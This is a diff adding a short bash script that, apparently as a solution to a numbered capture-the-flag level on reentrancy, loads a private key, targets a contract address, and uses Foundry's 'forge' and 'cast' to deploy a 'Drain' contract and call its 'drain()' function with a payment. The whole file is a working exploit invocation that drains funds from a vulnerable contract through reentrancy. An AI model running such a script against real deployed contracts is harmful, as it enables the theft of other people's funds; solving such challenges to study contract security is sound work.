@@ -1,0 +1,10 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+CON=0xce21B0fB3eC08E8B9a2364165B85e307153DC6cB
+
+# forge create --private-key $KEY '10.reentrancy.sol:Drain' --constructor-args $CON
+DRAIN=0x91113e92adb0d62aa86f8e0b4e25fe81480f4b9b
+cast send --private-key $KEY --value 1 $DRAIN 'drain()'
